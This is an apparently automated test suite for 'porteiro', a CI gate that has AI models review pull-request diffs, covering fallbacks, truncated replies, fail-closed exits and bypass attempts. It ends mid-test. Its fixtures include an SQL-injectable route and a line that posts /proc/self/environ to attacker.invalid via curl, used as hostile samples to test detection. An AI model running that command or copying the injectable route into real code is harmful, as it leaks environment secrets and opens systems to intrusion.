"""Gatekeeper: z.ai HTTP 429 with error code 1113 (no balance) stops at once;
1302 (rate limit) keeps the backoff. The gate still fails closed (exit 3).
Round 2: no verdict shopping (cut replies with findings, content filters),
time budget that fits the job, odd response bodies, private failure reasons.
Round 3: quoted diff headers, cut replies that don't parse, lenient normalize,
partial reads of big diffs, public log without failure reasons.
Round 4: binary route, pathspec excludes and lockfiles, severity/confidence
spellings, dropped findings, duplicate keys, submodules, tests in CI.
Round 5: assets skipped only when every name is an image/font and the block is
really binary; symlinks, snapshots, non-asset binaries, English keys, big
risk-only diffs, image-only PRs.
Round 6: the gate's own source (U+FFFD only on added lines), assets decided by
the new side, a finding cut before its severity, repeated keys, severity words.
Round 7: capitalised keys (main's raw fallback had re.I), .ttf/.avif only with a
NUL start, non-Latin and parenthesised severities, a loose summary object.
Round 8: a grave severity outside the list, uppercase image extensions.
English-only repo: the prompt asks for English keys; the Portuguese keys,
severity words, flags and mode values are still accepted."""
import http.client
import io
import json
import os
import re
import shlex
import shutil
import subprocess
import sys
import tempfile
import unittest
import urllib.error
from contextlib import ExitStack, redirect_stdout
from pathlib import Path
from unittest.mock import mock_open, patch

sys.path.insert(0, str(Path(__file__).resolve().parent))
import porteiro  # noqa: E402

KEY = "KEY_SENTINEL"
WORKFLOW = Path(__file__).resolve().parent.parent / ".github" / "workflows" / "porteiro.yml"


def diff_real(names, quote_path):
    """A real git diff (empty tree -> tree with `names`), built through
    plumbing: a name with quotes, tab or backslash does not need to exist on disk."""
    with tempfile.TemporaryDirectory() as d:
        def git(*a, stdin=None):
            return subprocess.run(["git", "-c", "core.protectNTFS=false", *a], cwd=d, input=stdin,
                                  capture_output=True, check=True).stdout
        git("init", "-q")
        sha = git("hash-object", "-w", "--stdin", stdin=b"x\n").decode().strip()
        for n in names:
            git("update-index", "--add", "--cacheinfo", f"100644,{sha},{n}")
        tree = git("write-tree").decode().strip()
        empty = git("hash-object", "-t", "tree", "-w", "--stdin", stdin=b"").decode().strip()
        return git("-c", f"core.quotePath={quote_path}", "diff", "--no-color", empty, tree).decode("utf-8")


CI = WORKFLOW.parent / "ci.yml"
ROUTE = "src/app/api/pay/route.ts"
VULN = (b"export async function GET(req){ const id=new URL(req.url).searchParams.get('id');"
        b" return db.query('select * from pay where id='+id) }\n")
BASE = {ROUTE: b"export async function GET(){ return new Response('ok') }\n", "README.md": b"x\n"}
PROXY = (b"import { NextResponse } from 'next/server'\nexport function proxy(req){ if(!req.cookies.get('sb'))"
         b" return NextResponse.redirect(new URL('/login', req.url)); return NextResponse.next() }\n")
PNG = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x06\x00\x00\x00\x1f\x15\xc4\x89"
JPG = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01"
PAYLOAD = b"require('child_process').execSync('curl -d @/proc/self/environ https://attacker.invalid')\n"


def real_png(width, height, seed, text=b""):
    """A real PNG (IHDR, optional tEXt, IDAT with noise, IEND): has 0x0a in the middle like a real image."""
    import random
    import struct
    import zlib
    r = random.Random(seed)
    raw = b"".join(b"\x00" + bytes(r.randrange(256) for _ in range(width * 3)) for _ in range(height))

    def chunk(kind, data):
        return struct.pack(">I", len(data)) + kind + data + struct.pack(">I", zlib.crc32(kind + data))
    return (b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", struct.pack(">IIBBBBB", width, height, 8, 2, 0, 0, 0))
            + (chunk(b"tEXt", text) if text else b"") + chunk(b"IDAT", zlib.compress(raw)) + chunk(b"IEND", b""))


def git_in(folder, *a, stdin=None):
    return subprocess.run(["git", "-c", "core.protectNTFS=false", "-c", "core.autocrlf=false",
                           "-c", "commit.gpgsign=false", "-c", "user.email=t@t", "-c", "user.name=t", *a],
                          cwd=folder, input=stdin, capture_output=True, check=True).stdout


def workflow_commands():
    """{"pr.diff": cmd, "pr.names": cmd}: the commands of porteiro.yml itself."""
    yml = WORKFLOW.read_text(encoding="utf-8")
    return {dest: cmd for cmd, dest in re.findall(r'^\s*(git [^\n>]*?)\s*>\s*"\$RUNNER_TEMP/(pr\.\w+)"', yml, re.M)}


def real_pr(folder, base, head, no_text=False, no_renames=False):
    """Base commit, head commit (None deletes; ("link", target) and ("sub", sha)
    become a 120000 symbolic link and a 160000 submodule through the index), and
    runs the workflow commands the way the job runs them. Returns (diff path, names path)."""
    repo = Path(folder, "repo")
    repo.mkdir()
    git_in(repo, "init", "-q")
    shas = []
    for tree in (base, head):
        special = {p: c for p, c in tree.items() if isinstance(c, tuple)}
        for p, c in tree.items():
            if p in special:
                continue
            f = repo / p
            f.parent.mkdir(parents=True, exist_ok=True)
            f.unlink() if c is None else f.write_bytes(c)
        git_in(repo, "add", "-A")
        for p, (kind, target) in special.items():
            sha = target if kind == "sub" else git_in(repo, "hash-object", "-w", "--stdin", stdin=target.encode()).decode().strip()
            git_in(repo, "update-index", "--add", "--cacheinfo", f"{'160000' if kind == 'sub' else '120000'},{sha},{p}")
        git_in(repo, "commit", "-qm", "x", "--allow-empty")
        shas.append(git_in(repo, "rev-parse", "HEAD").decode().strip())
    outputs = []
    for dest in ("pr.diff", "pr.names"):
        cmd = workflow_commands()[dest].replace("$BASE...$HEAD", "{}...{}".format(*shas))
        if no_text:  # a local run, or the old workflow: no --text
            cmd = cmd.replace(" --text", "")
        if no_renames:  # a local run: git's default rename detection
            cmd = cmd.replace(" --no-renames", "")
        Path(folder, dest).write_bytes(subprocess.run(shlex.split(cmd), cwd=repo, capture_output=True, check=True).stdout)
        outputs.append(str(Path(folder, dest)))
    return tuple(outputs)


def submodule_diff(before, after):
    """A real diff of a submodule (mode 160000); before=None = new submodule."""
    with tempfile.TemporaryDirectory() as d:
        git_in(d, "init", "-q")
        trees = []
        for target in (before, after):
            git_in(d, "read-tree", "--empty")
            if target:
                git_in(d, "update-index", "--add", "--cacheinfo", f"160000,{target},vendor/sub")
            trees.append(git_in(d, "write-tree").decode().strip())
        return git_in(d, "-c", "core.quotePath=false", "diff", "--no-color", "--text", *trees).decode()


class ZaiErrorTest(unittest.TestCase):
    def run_gate(self, code, channel="on Telegram"):
        def respond(*_args, **_kwargs):
            body = json.dumps({"error": {"code": code, "message": "msg"}}).encode()
            raise urllib.error.HTTPError(porteiro.URL, 429, "Too Many Requests", {}, io.BytesIO(body))

        out = io.StringIO()
        with patch.dict(os.environ, {"GLM_API_KEY": KEY, "PORTEIRO_MODO": "warn"}, clear=True), \
             patch("builtins.open", mock_open(read_data="diff --git a/a b/a\n+x")), \
             patch.object(porteiro, "write_file") as write, \
             patch.object(porteiro, "send_detail", return_value=channel) as detail, \
             patch.object(porteiro.time, "sleep") as sleep, \
             patch("urllib.request.urlopen", side_effect=respond) as req, \
             redirect_stdout(out):
            exit_code = porteiro.main(["--diff", "d", "--scoreboard", "p"])
        board = write.call_args.args[1]
        self.assertEqual(exit_code, 3)  # fail-closed, even in "warn"
        self.assertIn("NOT ANALYZED", board)
        self.assertNotIn(KEY, out.getvalue() + board)
        return req.call_count, sleep.call_count, board, out.getvalue(), str(detail.call_args)

    def test_1113_stops_at_once_and_says_no_balance(self):
        calls, sleeps, board, log, private = self.run_gate("1113")
        self.assertEqual((calls, sleeps), (1, 0))
        self.assertIn("no balance left on z.ai (code 1113)", private)
        self.assertNotIn("1113", board)  # billing state stays out of the public comment
        # Round 3: the private channel got the reason, so the public log has no code...
        self.assertNotIn("1113", log)
        self.assertIn("no verdict: z.ai glm-5 (reason in the private channel)", log)
        # ...and only the short code when the alert did not go through.
        _, _, _, log, _ = self.run_gate("1113", channel="not delivered (HTTP 500)")
        self.assertIn("z.ai glm-5: code 1113", log)
        self.assertNotIn("balance", log)

    def test_1302_keeps_the_backoff_and_shows_the_code(self):
        calls, sleeps, board, log, private = self.run_gate("1302")
        self.assertEqual((calls, sleeps), (6, 5))
        self.assertIn("code 1302", private)
        self.assertNotIn("1302", board)
        self.assertNotIn("1302", log)
        _, _, _, log, _ = self.run_gate("1302", channel="unavailable (private channel not configured)")
        self.assertIn("z.ai glm-5: HTTP 429, code 1302", log)


EMPTY_JSON = '{"findings":[]}'
FAIL_JSON = json.dumps({"findings": [
    {"title": "IDOR", "file": "a", "severity": "high", "confidence": 0.9}]})
WARNING_JSON = json.dumps({"findings": [
    {"title": "light", "file": "a", "severity": "low", "confidence": 0.9}]})
HIGH = {"title": "IDOR", "file": "a", "severity": "high", "confidence": 0.9}
# Reply cut mid-array: one complete blocking finding, then half of another.
CUT_WITH_BLOCKER = '{"findings":[' + json.dumps(HIGH) + ',{"title":"second","sever'
# Cut before any finding closed, but the raw text already says "critical".
CUT_HINT_ONLY = '{"findings":[{"severity": "critical","file":"a","title":"SQL inj'
ALL_KEYS = {"GLM_API_KEY": KEY, "KIMI_API_KEY": KEY, "OPENAI_API_KEY": KEY}
Z1113 = (429, {"code": "1113", "message": "m"})
Z1302 = (429, {"code": "1302", "message": "m"})
KIMI_QUOTA = (429, {"type": "exceeded_current_quota_error", "message": "m"})
OPENAI_QUOTA = (429, {"code": "insufficient_quota", "type": "insufficient_quota", "message": "m"})


class FallbackChainTest(unittest.TestCase):
    """With no verdict from the provider of the moment, the next one analyzes. A valid verdict does not fall through.

    Response per model: str = content with finish "stop"; (content, finish);
    (HTTP status, error body); bytes = raw body; exception = raised;
    list = one per call (the last one repeats)."""

    def run_gate(self, per_model, env=ALL_KEYS, mode="block", clock=None,
                 diff="diff --git a/a b/a\n+x", channel="on Telegram", real=None,
                 flags=("--diff", "--names", "--scoreboard")):
        """real=(diff, names): real files on disk, with no mock of open.
        flags: the spelling of --diff, --names and --scoreboard (in that order)."""
        requests, self.timeouts = [], []

        def respond(req, timeout=None):
            body = json.loads(req.data)
            requests.append((req.full_url, body))
            self.timeouts.append(timeout)
            r = per_model[body["model"]]
            if isinstance(r, list):
                r = r.pop(0) if len(r) > 1 else r[0]
            if isinstance(r, BaseException):
                if clock is not None:
                    clock[0] += timeout  # the call hung until its timeout
                raise r
            if isinstance(r, bytes):
                return io.BytesIO(r)
            if not isinstance(r, str) and isinstance(r[0], int):
                raise urllib.error.HTTPError(req.full_url, r[0], "x", {},
                                             io.BytesIO(json.dumps({"error": r[1]}).encode()))
            content, finish = (r, "stop") if isinstance(r, str) else r
            return io.BytesIO(json.dumps({"choices": [{"message": {"content": content},
                              "finish_reason": finish}], "usage": {"total_tokens": 10}}).encode())

        def sleep_clock(s):
            if clock is not None:
                clock[0] += s

        out = io.StringIO()
        diff_flag, names_flag, board_flag = flags
        with ExitStack() as stack:
            stack.enter_context(patch.dict(os.environ, dict(env, PORTEIRO_MODO=mode), clear=True))
            if not real:
                stack.enter_context(patch("builtins.open", mock_open(read_data=diff)))
            write = stack.enter_context(patch.object(porteiro, "write_file"))
            detail = stack.enter_context(patch.object(porteiro, "send_detail", return_value=channel))
            sleep = stack.enter_context(patch.object(porteiro.time, "sleep", side_effect=sleep_clock))
            if clock is not None:
                stack.enter_context(patch.object(porteiro.time, "monotonic", side_effect=lambda: clock[0]))
            stack.enter_context(patch("urllib.request.urlopen", side_effect=respond))
            stack.enter_context(redirect_stdout(out))
            code = porteiro.main([diff_flag, real[0], names_flag, real[1], board_flag, "p"] if real
                                 else [diff_flag, "d", board_flag, "p"])
        board = write.call_args.args[1]
        self.assertNotIn(KEY, out.getvalue() + board)
        self.sleeps = sleep.call_count
        self.private = str(detail.call_args_list)
        self.detail = detail.call_args_list
        self.log = out.getvalue()
        return code, board, [c["model"] for _, c in requests], requests

    def test_1113_on_zai_uses_kimi_k3(self):
        code, board, models, _ = self.run_gate({"glm-5": Z1113, "kimi-k3": EMPTY_JSON})
        self.assertEqual((code, models, self.sleeps), (0, ["glm-5", "kimi-k3"], 0))
        self.assertIn("Kimi kimi-k3 (reserve)", board)
        self.assertNotIn("1113", board)
        self.assertIn("code 1113", self.private)

    def test_kimi_without_quota_uses_k26(self):
        code, board, models, _ = self.run_gate(
            {"glm-5": Z1113, "kimi-k3": KIMI_QUOTA, "kimi-k2.6": EMPTY_JSON})
        self.assertEqual((code, models, self.sleeps), (0, ["glm-5", "kimi-k3", "kimi-k2.6"], 0))
        self.assertIn("Kimi kimi-k2.6 (reserve)", board)

    def test_k26_fails_uses_openai(self):
        code, board, models, requests = self.run_gate(
            {"glm-5": Z1113, "kimi-k3": KIMI_QUOTA,
             "kimi-k2.6": (401, {"type": "invalid_authentication_error"}), "gpt-6-astra": EMPTY_JSON})
        self.assertEqual((code, models), (0, ["glm-5", "kimi-k3", "kimi-k2.6", "gpt-6-astra"]))
        self.assertIn("OpenAI gpt-6-astra (reserve)", board)
        url, body = requests[-1]
        self.assertEqual(url, "https://api.openai.com/v1/chat/completions")
        self.assertNotIn("temperature", body)
        self.assertNotIn("max_tokens", body)  # gpt-5.x rejects it; uses max_completion_tokens
        self.assertGreaterEqual(body["max_completion_tokens"], 8192)

    def test_all_fail_fail_closed(self):
        for mode in ("warn", "block"):
            code, board, models, _ = self.run_gate(
                {"glm-5": Z1113, "kimi-k3": KIMI_QUOTA, "kimi-k2.6": "sorry, I don't know",
                 "gpt-6-astra": OPENAI_QUOTA, "gpt-5.5": OPENAI_QUOTA}, mode=mode)
            self.assertEqual(code, 3)
            # k2.6 answered out of format 3x (the three caps) before falling through.
            self.assertEqual(models, ["glm-5", "kimi-k3"] + ["kimi-k2.6"] * 3 + ["gpt-6-astra", "gpt-5.5"])
            self.assertIn("NOT ANALYZED", board)
            self.assertIn("no AI available (5 providers)", board)
            for piece in ("z.ai glm-5: no balance left on z.ai (code 1113)",
                          "Kimi kimi-k3: no balance left on Kimi (code exceeded_current_quota_error)",
                          "Kimi kimi-k2.6: did not return JSON",
                          "OpenAI gpt-6-astra: no balance left on OpenAI (code insufficient_quota)",
                          "OpenAI gpt-5.5: no balance left on OpenAI (code insufficient_quota)"):
                self.assertIn(piece, self.private)
            # Billing and credential reasons never reach the public comment.
            for not_public in ("1113", "balance", "insufficient_quota", "exceeded_current_quota_error"):
                self.assertNotIn(not_public, board)

    def test_no_key_is_skipped(self):
        code, board, models, _ = self.run_gate({"kimi-k3": EMPTY_JSON}, env={"KIMI_API_KEY": KEY})
        self.assertEqual((code, models), (0, ["kimi-k3"]))
        self.assertIn("Kimi kimi-k3 (reserve)", board)
        self.assertNotIn("no key", board)
        self.assertIn("z.ai glm-5: no key", self.private)
        code, board, models, _ = self.run_gate({}, env={})
        self.assertEqual((code, models), (3, []))
        self.assertIn("no analyzer key", board)

    def test_primary_fail_verdict_does_not_fall_through(self):
        code, board, models, _ = self.run_gate({"glm-5": FAIL_JSON, "kimi-k3": EMPTY_JSON})
        self.assertEqual((code, models), (1, ["glm-5"]))
        self.assertIn("1 blocker", board)
        self.assertNotIn("reserve", board)

    def test_moonshot_body_without_temperature_and_cap_8192(self):
        _, _, _, requests = self.run_gate({"glm-5": Z1113, "kimi-k3": EMPTY_JSON})
        (url_z, zai), (url_k, kimi) = requests
        self.assertEqual(url_k, "https://api.moonshot.ai/v1/chat/completions")
        self.assertNotIn("temperature", kimi)
        self.assertGreaterEqual(kimi["max_tokens"], 8192)
        # The primary stays the same: z.ai, glm-5, temperature 0.1, cap 4000.
        self.assertEqual((url_z, zai["temperature"], zai["max_tokens"]), (porteiro.URL, 0.1, 4000))

    def test_default_chain_only_with_approved_fallbacks(self):
        # glm-5 first, then only those that passed the adversarial control of 15/09/2026.
        self.assertEqual([p.label for p in porteiro.read_chain({})],
                         ["z.ai glm-5", "Kimi kimi-k3", "Kimi kimi-k2.6",
                          "OpenAI gpt-6-astra", "OpenAI gpt-5.5"])

    def test_chain_and_primary_model_configurable(self):
        _, _, models, _ = self.run_gate({"glm-4.6": EMPTY_JSON},
                                        env=dict(ALL_KEYS, PORTEIRO_MODELO="glm-4.6"))
        self.assertEqual(models, ["glm-4.6"])
        _, board, models, _ = self.run_gate({"gpt-x": Z1113, "glm-5": EMPTY_JSON},
                                            env=dict(ALL_KEYS, PORTEIRO_CADEIA="openai:gpt-x, zai:glm-5"))
        self.assertEqual(models, ["gpt-x", "glm-5"])
        self.assertIn("z.ai glm-5 (reserve)", board)

    # ---- Round 2: no verdict shopping -----------------------------------
    def test_A_blocker_cut_by_length_blocks(self):
        code, board, models, _ = self.run_gate(
            {"glm-5": (FAIL_JSON, "length"), "kimi-k3": EMPTY_JSON})
        self.assertEqual((code, models), (1, ["glm-5"]))  # zero Kimi calls
        self.assertIn("1 blocker", board)
        self.assertIn("Cut response (truncated)", board)

    def test_A2_blocker_cut_by_sensitive(self):
        code, board, models, _ = self.run_gate(
            {"glm-5": (FAIL_JSON, "sensitive"), "kimi-k3": EMPTY_JSON})
        self.assertEqual((code, models), (1, ["glm-5"]))
        self.assertIn("1 blocker", board)

    def test_B_blocker_cut_then_429_does_not_fall_through(self):
        code, board, models, _ = self.run_gate(
            {"glm-5": [(FAIL_JSON, "length"), Z1302], "kimi-k3": EMPTY_JSON})
        self.assertEqual((code, models), (1, ["glm-5"]))
        self.assertIn("1 blocker", board)

    def test_B2_warning_cut_then_429_gives_3(self):
        for mode in ("warn", "block"):
            code, board, models, _ = self.run_gate(
                {"glm-5": [(WARNING_JSON, "network_error"), Z1302], "kimi-k3": EMPTY_JSON}, mode=mode)
            self.assertEqual((code, models), (3, ["glm-5"]))
            self.assertIn("NOT ANALYZED", board)
            self.assertIn("cut response", board)
            self.assertIn("light", self.private)  # the finding still reaches the private channel

    def test_C_zai_filter_1301_closes_without_fallback(self):
        for mode in ("warn", "block"):
            code, board, models, _ = self.run_gate(
                {"glm-5": (400, {"code": "1301", "message": "m"}), "kimi-k3": EMPTY_JSON}, mode=mode)
            self.assertEqual((code, models), (3, ["glm-5"]))
            self.assertIn("content filter, code 1301", board)

    def test_C2_moonshot_filter_closes_without_fallback(self):
        code, board, models, _ = self.run_gate(
            {"glm-5": Z1113, "kimi-k3": (400, {"type": "content_filter", "message": "m"}),
             "kimi-k2.6": EMPTY_JSON, "gpt-6-astra": EMPTY_JSON})
        self.assertEqual((code, models), (3, ["glm-5", "kimi-k3"]))
        self.assertIn("content filter", board)

    def test_C3_finish_content_filter_and_refusal_close(self):
        refusal = json.dumps({"choices": [{"message": {"content": None, "refusal": "no"},
                                           "finish_reason": "stop"}]}).encode()
        for reply in ((EMPTY_JSON, "content_filter"), (EMPTY_JSON, "sensitive"), refusal):
            code, board, models, _ = self.run_gate({"glm-5": reply, "kimi-k3": EMPTY_JSON})
            self.assertEqual((code, models), (3, ["glm-5"]), reply)
            self.assertIn("content filter", board)

    # ---- Round 2: robustness ---------------------------------------------
    def test_D_odd_body_becomes_failed_attempt(self):
        for body in (b"null", b"[]", b'{"choices": null}', b'{"choices": [null]}',
                     b'{"choices": [{"message": "x"}]}',
                     b'{"choices": [{"message": {"content": 5}}], "usage": "x"}',
                     b"\x80\x81", http.client.IncompleteRead(b"")):
            with self.subTest(body=body):
                code, _, models, _ = self.run_gate({"glm-5": body, "kimi-k3": EMPTY_JSON})
                self.assertEqual((code, models[-1]), (0, "kimi-k3"))

    # ---- Round 2: time budget --------------------------------------------
    def test_E_whole_chain_fits_the_job_deadline(self):
        clock = [0.0]
        code, board, models, _ = self.run_gate(
            {m: TimeoutError("timed out") for m in ("glm-5", "kimi-k3", "kimi-k2.6", "gpt-6-astra", "gpt-5.5")},
            clock=clock)
        self.assertEqual(code, 3)
        self.assertIn("NOT ANALYZED", board)
        # Every reserve got its turn, and nothing ran past the analysis step's cap.
        self.assertEqual(set(models), {"glm-5", "kimi-k3", "kimi-k2.6", "gpt-6-astra", "gpt-5.5"})
        self.assertLessEqual(clock[0], porteiro.TOTAL_DEADLINE)
        cap_min = min(int(m) for m in re.findall(r"timeout-minutes:\s*(\d+)", WORKFLOW.read_text(encoding="utf-8")))
        self.assertLessEqual(clock[0] + 60, cap_min * 60, clock[0])
        self.assertLessEqual(max(self.timeouts), 180)

    def test_F_editing_the_gate_itself_is_a_risk_path(self):
        for path in ("scripts/porteiro.py", "scripts/test_porteiro.py", ".github/workflows/porteiro.yml"):
            self.assertTrue(porteiro.is_risky(path), path)

    def test_F2_scripts_ci_runs_are_risk_paths(self):
        # backup.yml runs backup-supabase.sh with database access; ci.yml runs
        # build-test-db.sh; the setup-*.mjs touch Stripe. Left off the list, in a
        # big diff, the model does not read them. json.py: a PR that only plants a module in scripts/.
        for path in ("scripts/backup-supabase.sh", "scripts/build-test-db.sh",
                     "scripts/setup-stripe-billing.mjs", "scripts/json.py"):
            self.assertTrue(porteiro.is_risky(path), path)

    def test_F3_risk_path_ignores_case(self):
        # On the CI Linux, fnmatch is case-sensitive: OAuth.ts did not match *auth*.
        for path in ("src/lib/OAuthCallback.ts", "Supabase/migrations/x.sql", "SRC/APP/API/x/route.ts",
                     "src/Proxy.ts", "Scripts/deploy.sh", ".github/Workflows/ci.yml", "apps/web/Package-Lock.json"):
            self.assertTrue(porteiro.is_risky(path), path)
        for path in ("src/components/Button.tsx", "docs/README.md"):
            self.assertFalse(porteiro.is_risky(path), path)

    # ---- Round 3: quoted paths (major 1) ---------------------------------
    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_G_quoted_header_from_real_git(self):
        names = ["src/über.ts", 'src/we"ird.ts', "src/tab\there.ts", "src/back\\slash.ts", "src/ok.ts"]
        for quote_path in ("true", "false"):
            diff = diff_real(names, quote_path)
            self.assertIn('diff --git "a/src/', diff)  # git really quoted some headers
            self.assertEqual(sorted(porteiro.diff_files(diff)), sorted(names), quote_path)
        # Mixed PR: the finding on the non-ASCII file is read and blocks.
        finding = json.dumps({"findings": [dict(HIGH, file="src/über.ts")]})
        code, board, models, _ = self.run_gate(
            {"glm-5": finding}, diff=diff_real(["src/über.ts", "src/ok.ts"], "true"))
        self.assertEqual((code, models), (1, ["glm-5"]))
        self.assertIn("1 blocker", board)
        self.assertIn("core.quotePath=false diff", WORKFLOW.read_text(encoding="utf-8"))

    def test_G1_workflow_takes_the_default_branch_gate_by_full_name(self):
        # The gate of the default branch judges the PR, never the PR's copy nor the base
        # (the author picks the base). FULL ref name: with fetch-depth 0 the checkout
        # downloads the tags, and a tag "origin/main" would beat the short name.
        yml = WORKFLOW.read_text(encoding="utf-8")
        extract = [l.strip() for l in yml.splitlines() if l.strip().startswith("git cat-file blob")]
        self.assertEqual(len(extract), 1, extract)
        self.assertIn('"refs/remotes/origin/$DEFAULT_BRANCH:scripts/porteiro.py"', extract[0])
        self.assertIn("${{ github.event.repository.default_branch }}", yml)
        self.assertIn('python3 "$RUNNER_TEMP/default-branch-gate/porteiro.py"', yml)
        self.assertNotIn("python3 scripts/porteiro.py --diff", yml)

    def test_G2_diff_with_content_and_no_readable_header_gives_3(self):
        for diff in ("+x\n-y\n", "diff --git c/x d/x\n+x\n", 'diff --git a/a b/a\n+x\ndiff --git "a/q\n+y\n'):
            for mode in ("warn", "block"):
                with self.subTest(diff=diff, mode=mode):
                    code, board, models, _ = self.run_gate({"glm-5": EMPTY_JSON}, diff=diff, mode=mode)
                    self.assertEqual((code, models), (3, []))
                    self.assertIn("NOT ANALYZED", board)

    # ---- Round 3: cut reply that does not parse (major 2) ----------------
    def test_H_cut_unparsed_with_whole_blocker_blocks(self):
        for finish in ("length", "network_error", "other"):
            with self.subTest(finish=finish):
                code, board, models, _ = self.run_gate(
                    {"glm-5": [(CUT_WITH_BLOCKER, finish), Z1302], "kimi-k3": EMPTY_JSON})
                self.assertEqual((code, models), (1, ["glm-5"]))  # never asks Kimi
                self.assertIn("1 blocker", board)
                self.assertIn("Cut response (malformed_json)", board)

    def test_H2_cut_with_only_a_hint_gives_3(self):
        for mode in ("warn", "block"):
            for finish in ("length", "network_error", "stop"):
                with self.subTest(mode=mode, finish=finish):
                    code, board, models, _ = self.run_gate(
                        {"glm-5": [(CUT_HINT_ONLY, finish), Z1302], "kimi-k3": EMPTY_JSON}, mode=mode)
                    self.assertEqual((code, models), (3, ["glm-5"]))
                    self.assertIn("NOT ANALYZED", board)
                    self.assertIn("cut response with a hint of a serious finding", board)
                    self.assertNotIn("SQL", board)
                    self.assertIn("hint of a serious finding", self.private)

    # ---- Round 3: minors ---------------------------------------------------
    def test_I_invalid_entry_does_not_drop_the_blocker(self):
        reply = json.dumps({"findings": [None, "x", {"title": "", "severity": "low"}, HIGH]})
        code, _, models, _ = self.run_gate({"glm-5": reply, "kimi-k3": EMPTY_JSON})
        self.assertEqual((code, models), (1, ["glm-5"]))
        # A critical/high entry without a title is kept and still blocks.
        no_title = json.dumps({"findings": [dict(HIGH, title=None, severity="critical")]})
        code, _, models, _ = self.run_gate({"glm-5": no_title, "kimi-k3": EMPTY_JSON})
        self.assertEqual((code, models), (1, ["glm-5"]))
        # Only invalid entries is still "out of format".
        self.assertIsNone(porteiro.normalize({"findings": [None, {"title": "", "severity": "medium"}]}))

    def test_J_absurd_number_does_not_crash(self):
        text = ('{"findings":[{"title":"IDOR","file":"a","severity":"high",'
                '"confidence":1' + "0" * 400 + ',"line":1e400}]}')
        a = porteiro.normalize(porteiro.extract_json(text))["findings"][0]
        # Round 4: a high finding whose confidence overflows is 1.0, not 0.5.
        self.assertEqual((a["confidence"], a["line"]), (1.0, 0))
        # NaN falls back to the default: 0.5 for a light finding; Round 5: a title
        # with no severity is high, so its default is 1.0.
        self.assertEqual(porteiro.normalize(porteiro.extract_json(
            '{"findings":[{"title":"t","severity":"low","confidence":NaN}]}'))["findings"][0]["confidence"], 0.5)
        self.assertEqual(porteiro.normalize(porteiro.extract_json(
            '{"findings":[{"title":"t","confidence":NaN}]}'))["findings"][0]["confidence"], 1.0)
        code, board, models, _ = self.run_gate({"glm-5": text})
        self.assertEqual((code, models), (1, ["glm-5"]))  # blocks, no crash
        self.assertIn("1 finding · 1 blocker", board)

    def test_K_pathological_json_becomes_malformed(self):
        for text in ("1" * 5000, "[" * 100000, '{"findings":' + "[" * 100000):
            self.assertIsNone(porteiro.extract_json(text))
        self.assertIsNone(porteiro.rescue('{"findings":[' + "[" * 100000))

    def test_K2_recursionerror_does_not_fall_to_the_next_ai(self):
        with patch.object(porteiro, "normalize", side_effect=RecursionError):
            code, board, models, _ = self.run_gate({"glm-5": EMPTY_JSON, "kimi-k3": EMPTY_JSON})
        self.assertEqual((code, models), (3, ["glm-5"]))
        self.assertIn("NOT ANALYZED", board)

    def test_L_finding_path_normalized_and_drop_counted(self):
        base = porteiro.normalize({"findings": [HIGH]})["findings"][0]
        for path in ("b/src/app/x.ts", "a/src/app/x.ts", "src\\app\\x.ts", "./src/app/x.ts"):
            blockers, _, dropped = porteiro.classify([dict(base, file=path)], ["src/app/x.ts"])
            self.assertEqual((len(blockers), dropped), (1, 0), path)
        # Round 4: only a non-blocking finding on an untouched file is dropped.
        reply = json.dumps({"findings": [dict(HIGH, file="b/a"),
                                         dict(HIGH, file="other.ts", title="base", severity="low")]})
        code, board, _, _ = self.run_gate({"glm-5": reply})
        self.assertEqual(code, 1)
        self.assertIn("1 finding · 1 blocker", board)
        self.assertEqual(self.detail[-1].args[3], 1)  # one dropped, counted privately
        self.assertIn("dropped: 2", porteiro.alert_body([], [], "7", "u", (), 2)["detalhe"])

    def test_M_big_diff_partial_never_green(self):
        big = "diff --git a/README.md b/README.md\n" + "+x\n" * 1000
        risk = "diff --git a/src/app/api/p.ts b/src/app/api/p.ts\n+y\n"
        env = dict(ALL_KEYS, PORTEIRO_MAX_DIFF_KB="1")
        for mode in ("warn", "block"):
            with self.subTest(mode=mode):
                code, board, models, requests = self.run_gate({"glm-5": EMPTY_JSON}, env=env, mode=mode, diff=big + risk)
                self.assertEqual((code, models), (3, ["glm-5"]))
                self.assertIn("PARTIAL — 1 file(s) not read (big diff)", board)
                self.assertNotIn("✅", board)
                self.assertNotIn("README", requests[0][1]["messages"][1]["content"])
                # No risk path at all: no AI call, and still not green.
                code, board, models, _ = self.run_gate({"glm-5": EMPTY_JSON}, env=env, mode=mode, diff=big)
                self.assertEqual((code, models), (3, []))
                self.assertIn("PARTIAL — 1 file(s) not read", board)
                self.assertNotIn("✅", board)
        # A blocking finding in the files that were read still blocks.
        finding = json.dumps({"findings": [dict(HIGH, file="src/app/api/p.ts")]})
        code, _, _, _ = self.run_gate({"glm-5": finding}, env=env, diff=big + risk)
        self.assertEqual(code, 1)

    def test_N_content_filter_sends_the_reasons_to_private(self):
        code, board, models, _ = self.run_gate(
            {"glm-5": Z1113, "kimi-k3": (400, {"type": "content_filter", "message": "m"})})
        self.assertEqual((code, models), (3, ["glm-5", "kimi-k3"]))
        self.assertIn("no balance left on z.ai (code 1113)", self.private)
        self.assertIn("Kimi kimi-k3: refused the diff (content filter, code content_filter)", self.private)
        self.assertIn("reason on Telegram", board)
        self.assertNotIn("1113", board)

    def test_O_public_log_only_label_and_code_if_not_delivered(self):
        self.run_gate({"glm-5": Z1113, "kimi-k3": EMPTY_JSON})
        self.assertIn("no verdict: z.ai glm-5 (reason in the private channel)", self.log)
        for private in ("1113", "balance"):
            self.assertNotIn(private, self.log)
        self.run_gate({"glm-5": Z1113, "kimi-k3": EMPTY_JSON}, channel="not delivered (HTTP 502)")
        self.assertIn("z.ai glm-5: code 1113", self.log)
        self.assertNotIn("balance", self.log)

    # ---- Round 4: pre-existing bypasses (each failed on main after #408) ----
    def pr(self, head, per_model, base=BASE, no_text=False, no_renames=False, **kw):
        with tempfile.TemporaryDirectory() as d:
            return self.run_gate(per_model, real=real_pr(d, base, head, no_text, no_renames), **kw)

    def seen(self, requests):
        return "".join(c["messages"][1]["content"] for _, c in requests)

    @unittest.skipUnless(shutil.which("git"), "git not installed")
    def test_P1_binary_does_not_hide_code(self):
        # The workflow's own diff command shows the code behind `* -diff`...
        # Round 5: ...and a NUL byte in a code file is "unread binary file" (3),
        # stricter than handing the model a route it may misread.
